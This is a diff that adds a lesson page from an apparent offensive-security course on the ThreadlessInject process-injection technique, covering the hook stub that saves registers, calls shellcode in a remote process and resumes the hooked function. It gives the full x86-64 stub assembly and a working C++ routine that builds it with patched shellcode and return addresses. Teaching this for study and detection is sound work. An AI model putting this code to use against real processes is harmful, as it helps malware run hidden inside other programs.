@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 5: The Hook Stub Architecture - ThreadlessInject Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F9F5;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#14b8a6;--accent2:#0d9488;--gradient:linear-gradient(135deg,#14b8a6,#0d9488)}</style>
+</head>
+<body>
+
+<button class="hamburger" onclick="document.querySelector('nav').classList.toggle('open')">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>ThreadlessInject Course</h2>
+<span>Threadless Injection Masterclass</span>
+</div>
+<a class="home-link" href="../ThreadlessInject_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span class="diff d1">1</span> Thread Creation Problem</a>
+<a class="mod-link" href="module2.html"><span class="diff d1">2</span> Remote Function Hooking</a>
+<a class="mod-link" href="module3.html"><span class="diff d1">3</span> Target Function Selection</a>
+<a class="mod-link" href="module4.html"><span class="diff d2">4</span> Remote Memory Allocation</a>
+<a class="mod-link active" href="module5.html"><span class="diff d2">5</span> Hook Stub Architecture</a>
+<a class="mod-link" href="module6.html"><span class="diff d2">6</span> Installing Remote Hook</a>
+<a class="mod-link" href="module7.html"><span class="diff d3">7</span> Execution &amp; Cleanup</a>
+<a class="mod-link" href="module8.html"><span class="diff d3">8</span> Full Chain &amp; Detection</a>
+</nav>
+
+<main>
+<span class="diff-badge medium">Difficulty: Intermediate</span>
+<h1>Module 5: The Hook Stub Architecture</h1>
+<p class="subtitle">The trampoline: save context, call payload, restore state, resume original function.</p>
+
+<div class="card highlight">
+<h4>The Heart of ThreadlessInject</h4>
+<p>The hook stub is the most critical piece of code in the entire technique. It is what actually executes in the target process when the hooked function is called. The stub must (1) save the entire CPU register state so the shellcode doesn't corrupt the calling thread's context, (2) call the shellcode, (3) restore the register state perfectly, (4) execute the original overwritten prologue bytes, and (5) jump back to the original function to resume normal execution. If any of these steps fails, the target process crashes.</p>
+</div>
+
+<h2>Register Preservation: The x64 Calling Convention</h2>
+<p>On Windows x64, the calling convention uses registers <code>RCX</code>, <code>RDX</code>, <code>R8</code>, and <code>R9</code> for the first four integer/pointer arguments, with <code>XMM0</code> through <code>XMM3</code> for floating-point arguments. The <strong>volatile</strong> registers (RAX, RCX, RDX, R8-R11) can be modified by called functions, while <strong>nonvolatile</strong> registers (RBX, RBP, RDI, RSI, R12-R15) must be preserved by callees.</p>
+
+<p>However, our hook stub is not a normal function call &mdash; it is an unexpected detour that happens when a thread is about to execute a function. The thread's register state at the moment of the hook is meaningful to the calling code. We must preserve <strong>all</strong> registers, including the volatile ones, because the caller expects to have its argument registers intact after the hooked function returns.</p>
+
+<table>
+<tr><th>Register Type</th><th>Registers</th><th>Must Save?</th><th>Why</th></tr>
+<tr><td>General Purpose (volatile)</td><td>RAX, RCX, RDX, R8-R11</td><td>Yes</td><td>Contain caller's arguments/state</td></tr>
+<tr><td>General Purpose (nonvolatile)</td><td>RBX, RBP, RDI, RSI, R12-R15</td><td>Yes</td><td>Shellcode might corrupt them</td></tr>
+<tr><td>Stack Pointer</td><td>RSP</td><td>Implicitly</td><td>Balanced by push/pop pairs</td></tr>
+<tr><td>Flags</td><td>RFLAGS</td><td>Yes</td><td>Conditional jumps depend on flags</td></tr>
+<tr><td>SIMD</td><td>XMM0-XMM5</td><td>Ideally yes</td><td>Floating-point arguments</td></tr>
+</table>
+
+<h2>The Hook Stub Assembly</h2>
+<p>Here is the hook stub that ThreadlessInject constructs. It is built as raw machine code bytes (position-independent) and written into the remote process. Every byte is carefully chosen:</p>
+
+<pre><code><span class="lang-tag">x86-64 ASM</span>; ThreadlessInject Hook Stub
+; This code is written into the remote process and executed when
+; a thread calls the hooked function
+
+hook_stub:
+    ; === PHASE 1: Save all registers ===
+    push rax            ; 50
+    push rcx            ; 51
+    push rdx            ; 52
+    push rbx            ; 53
+    push rbp            ; 55
+    push rsi            ; 56
+    push rdi            ; 57
+    push r8             ; 41 50
+    push r9             ; 41 51
+    push r10            ; 41 52
+    push r11            ; 41 53
+    push r12            ; 41 54
+    push r13            ; 41 55
+    push r14            ; 41 56
+    push r15            ; 41 57
+    pushfq              ; 9C  (save RFLAGS)
+
+    ; === PHASE 2: Align stack to 16 bytes (x64 ABI requirement) ===
+    mov rbp, rsp        ; 48 89 E5  - save current stack pointer
+    and rsp, 0xFFFFFFF0 ; 48 83 E4 F0 - align to 16-byte boundary
+    sub rsp, 0x20       ; 48 83 EC 20 - allocate shadow space
+
+    ; === PHASE 3: Call shellcode ===
+    ; The shellcode address is embedded in the stub at a known offset
+    mov rax, 0xDEADBEEFCAFEBABE  ; 48 B8 [8-byte shellcode address]
+    call rax            ; FF D0
+
+    ; === PHASE 4: Restore stack and all registers ===
+    mov rsp, rbp        ; 48 89 EC  - restore stack pointer
+    popfq               ; 9D  (restore RFLAGS)
+    pop r15             ; 41 5F
+    pop r14             ; 41 5E
+    pop r13             ; 41 5D
+    pop r12             ; 41 5C
+    pop r11             ; 41 5B
+    pop r10             ; 41 5A
+    pop r9              ; 41 59
+    pop r8              ; 41 58
+    pop rdi             ; 5F
+    pop rsi             ; 5E
+    pop rbp             ; 5D
+    pop rbx             ; 5B
+    pop rdx             ; 5A
+    pop rcx             ; 59
+    pop rax             ; 58
+
+    ; === PHASE 5: Execute original bytes (saved from hooked function) ===
+    ; [14 bytes of original prologue instructions are placed here]
+
+    ; === PHASE 6: Jump back to hooked function + 14 ===
+    jmp [rip+0]         ; FF 25 00 00 00 00
+    dq original_func+14 ; [8-byte address of instruction after our overwrite]</code></pre>
+
+<div class="card">
+<h4>Position-Independent Construction</h4>
+<p>Notice that the hook stub uses only relative addressing (push/pop, <code>mov reg, imm64</code>, <code>call reg</code>, and <code>jmp [rip+0]</code>). It never references absolute addresses through RIP-relative loads that depend on the stub's position. The only absolute addresses are the shellcode pointer (embedded as an immediate in the <code>MOV RAX</code>) and the jump-back target (embedded after the <code>JMP [RIP+0]</code>). These are patched in by the injector before writing the stub to the remote process.</p>
+</div>
+
+<h2>Building the Stub Programmatically</h2>
+<p>ThreadlessInject constructs the hook stub as a byte array in the injector process, patches in the correct addresses, and then writes the completed stub to the remote process:</p>
+
+<pre><code><span class="lang-tag">C++</span>// Building the hook stub as a byte array
+// Each section corresponds to a phase from the assembly above
+
+void BuildHookStub(BYTE* stub, UINT64 shellcodeAddr,
+                   BYTE* origBytes, UINT64 origFuncAddr) {
+    int offset = 0;
+
+    // Phase 1: Push all general-purpose registers + flags
+    BYTE saveRegs[] = {
+        0x50,                         // push rax
+        0x51,                         // push rcx
+        0x52,                         // push rdx
+        0x53,                         // push rbx
+        0x55,                         // push rbp
+        0x56,                         // push rsi
+        0x57,                         // push rdi
+        0x41, 0x50,                   // push r8
+        0x41, 0x51,                   // push r9
+        0x41, 0x52,                   // push r10
+        0x41, 0x53,                   // push r11
+        0x41, 0x54,                   // push r12
+        0x41, 0x55,                   // push r13
+        0x41, 0x56,                   // push r14
+        0x41, 0x57,                   // push r15
+        0x9C                          // pushfq
+    };
+    memcpy(stub + offset, saveRegs, sizeof(saveRegs));
+    offset += sizeof(saveRegs);
+
+    // Phase 2: Align stack + shadow space
+    BYTE alignStack[] = {
+        0x48, 0x89, 0xE5,            // mov rbp, rsp
+        0x48, 0x83, 0xE4, 0xF0,      // and rsp, -16
+        0x48, 0x83, 0xEC, 0x20       // sub rsp, 0x20
+    };
+    memcpy(stub + offset, alignStack, sizeof(alignStack));
+    offset += sizeof(alignStack);
+
+    // Phase 3: Load shellcode address and call it
+    stub[offset++] = 0x48;           // REX.W prefix
+    stub[offset++] = 0xB8;           // mov rax, imm64
+    *(UINT64*)(stub + offset) = shellcodeAddr;  // Patch shellcode address
+    offset += 8;
+    stub[offset++] = 0xFF;           // call rax
+    stub[offset++] = 0xD0;
+
+    // Phase 4: Restore stack + pop all registers + flags
+    BYTE restoreRegs[] = {
+        0x48, 0x89, 0xEC,            // mov rsp, rbp
+        0x9D,                         // popfq
+        0x41, 0x5F,                   // pop r15
+        0x41, 0x5E,                   // pop r14
+        0x41, 0x5D,                   // pop r13
+        0x41, 0x5C,                   // pop r12
+        0x41, 0x5B,                   // pop r11
+        0x41, 0x5A,                   // pop r10
+        0x41, 0x59,                   // pop r9
+        0x41, 0x58,                   // pop r8
+        0x5F,                         // pop rdi
+        0x5E,                         // pop rsi
+        0x5D,                         // pop rbp
+        0x5B,                         // pop rbx
+        0x5A,                         // pop rdx
+        0x59,                         // pop rcx
+        0x58                          // pop rax
+    };
+    memcpy(stub + offset, restoreRegs, sizeof(restoreRegs));
+    offset += sizeof(restoreRegs);
+
+    // Phase 5: Execute the saved original bytes
+    memcpy(stub + offset, origBytes, 14);
+    offset += 14;
+
+    // Phase 6: Jump back to original function + 14
+    stub[offset++] = 0xFF;           // jmp [rip+0]
+    stub[offset++] = 0x25;
+    *(DWORD*)(stub + offset) = 0;    // RIP-relative offset = 0
+    offset += 4;
+    *(UINT64*)(stub + offset) = origFuncAddr + 14;  // Jump target
+    offset += 8;
+}</code></pre>
+
+<h2>Stack Alignment: A Critical Detail</h2>
+<p>The x64 Windows ABI requires the stack to be 16-byte aligned at the point of a <code>CALL</code> instruction. After our series of pushes, the stack pointer is not guaranteed to be aligned (it depends on how many pushes we did and the alignment when we entered). The <code>AND RSP, -16</code> instruction forces alignment, and we save the original RSP in RBP so we can restore it exactly after the shellcode returns.</p>
+
+<div class="diagram">
+<h4>Hook Stub Execution Flow</h4>
+<div class="flow">
+<div class="box r">Thread enters<br>hooked func</div>
+<div class="arrow">&rarr;</div>
+<div class="box hl">JMP to<br>hook stub</div>
+<div class="arrow">&rarr;</div>
+<div class="box">PUSH all<br>registers</div>
+<div class="arrow">&rarr;</div>
+<div class="box y">CALL<br>shellcode</div>
+<div class="arrow">&rarr;</div>
+<div class="box">POP all<br>registers</div>
+<div class="arrow">&rarr;</div>
+<div class="box g">Execute orig<br>bytes + JMP</div>
+</div>
+</div>
+
+<div class="card warn">
+<h4>Shadow Space Requirement</h4>
+<p>The <code>sub rsp, 0x20</code> instruction allocates 32 bytes of "shadow space" (also called "home space" or "spill space") that the x64 calling convention requires the caller to provide. Even if the shellcode doesn't use it, many Windows API functions internally expect this space to be present. Failing to allocate it can cause the shellcode (or any function it calls) to corrupt the stack when it tries to spill register arguments to the shadow area.</p>
+</div>
+
+<h2>Why the Stub Must Be Position-Independent</h2>
+<p>The hook stub is compiled as raw bytes and placed at an arbitrary address in the remote process. It cannot contain relocations or absolute address references to itself, because we don't know the final address until we allocate memory in the remote process. All control flow within the stub uses relative instructions (push, pop, call via register), and the two absolute addresses (shellcode entry and jump-back target) are patched as immediate values before the stub is written.</p>
+
+<p>This is the same constraint that shellcode faces: you must be able to run at any address without modification. The difference is that our stub is not standalone shellcode &mdash; it's a wrapper that calls standalone shellcode and then transparently resumes the hooked function.</p>
+
+<div class="card green">
+<h4>Correctness Guarantee</h4>
+<p>If the hook stub correctly saves and restores all registers, correctly executes the original overwritten bytes, and correctly jumps back to the right address, then the calling thread is completely unaware that the hook existed. The hooked function behaves identically to the unhooked version from the caller's perspective, except for a brief delay (the time it takes to run the shellcode). This transparency is what makes ThreadlessInject so powerful: the target process continues running normally after the injection.</p>
+</div>
+
+<div class="quiz" id="quiz5">
+<h4>Pop Quiz: Hook Stub Architecture</h4>
+<div class="quiz-q" data-correct="1">
+<p>Q1: Why does the hook stub save volatile registers (RAX, RCX, RDX, R8-R11) even though the calling convention says callees can modify them?</p>
+<label data-opt="0"><input type="radio" name="q5_0"> It is required by the Windows kernel</label>
+<label data-opt="1"><input type="radio" name="q5_0"> The hook is not a normal function call; the caller's argument registers must be intact when the original function finally executes</label>
+<label data-opt="2"><input type="radio" name="q5_0"> Volatile registers contain sensitive security data</label>
+<label data-opt="3"><input type="radio" name="q5_0"> Only nonvolatile registers are actually saved</label>
+<div class="explain">The hook fires at the very beginning of the target function, before it has used its arguments. The caller passed arguments in RCX, RDX, R8, R9 and expects the function to receive them. If our shellcode corrupts these registers, the original function will operate on garbage data when it finally runs. We must preserve the entire register state.</div>
+</div>
+<div class="quiz-q" data-correct="2">
+<p>Q2: What is the purpose of "AND RSP, -16" in the hook stub?</p>
+<label data-opt="0"><input type="radio" name="q5_1"> It clears the stack to prevent data leaks</label>
+<label data-opt="1"><input type="radio" name="q5_1"> It allocates 16 bytes of stack space</label>
+<label data-opt="2"><input type="radio" name="q5_1"> It aligns the stack to a 16-byte boundary as required by the x64 Windows ABI</label>
+<label data-opt="3"><input type="radio" name="q5_1"> It marks the stack as non-executable</label>
+<div class="explain">The x64 Windows calling convention requires RSP to be 16-byte aligned at the point of a CALL instruction. After our series of PUSH instructions, the stack may not be aligned. AND RSP, -16 (which is AND RSP, 0xFFFFFFFFFFFFFFF0) rounds RSP down to the nearest 16-byte boundary.</div>
+</div>
+<div class="quiz-q" data-correct="0">
+<p>Q3: How is the shellcode address embedded in the hook stub?</p>
+<label data-opt="0"><input type="radio" name="q5_2"> As a 64-bit immediate value in a MOV RAX instruction, patched before writing the stub to the remote process</label>
+<label data-opt="1"><input type="radio" name="q5_2"> Via a RIP-relative LEA instruction</label>
+<label data-opt="2"><input type="radio" name="q5_2"> Through a global variable in the target process</label>
+<label data-opt="3"><input type="radio" name="q5_2"> By looking it up in the PEB at runtime</label>
+<div class="explain">The injector knows the shellcode address (since it allocated the memory and placed the shellcode there) and embeds it directly into the MOV RAX, imm64 instruction (opcode 48 B8 + 8 bytes). This is patched into the byte array before writing the complete stub to the remote process.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz5')">Check Answers</button>
+<div class="quiz-result"></div>
+</div>
+
+<div class="nav-btns">
+<a href="module4.html">&larr; Previous: Remote Memory Allocation</a>
+<a class="primary" href="module6.html">Next: Installing the Remote Hook &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
